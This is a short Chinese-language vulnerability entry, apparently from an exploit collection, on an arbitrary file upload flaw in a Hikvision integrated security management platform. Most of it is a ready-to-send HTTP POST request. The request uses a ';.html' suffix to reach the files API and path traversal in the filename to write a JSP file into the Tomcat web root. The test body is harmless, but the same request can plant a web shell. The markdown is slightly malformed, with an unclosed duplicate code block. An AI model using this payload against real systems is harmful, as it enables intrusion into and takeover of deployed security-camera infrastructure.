# Hikvision 综合安防管理平台 files 任意文件上传漏洞

## 漏洞描述
Hikvision 综合安防管理平台 files 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
登陆页面

![image-20220824134144287](images/202208241341481.png)

需要开放运行管理中心 (8001端口)

![image-20230828163622054](images/image-20230828163622054.png)

```
POST /center/api/files;.html HTTP/1.1

## Payloads
```
POST /center/api/files;.html HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/Hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test3");%>

------WebKitFormBoundary9PggsiM755PLa54a--
```
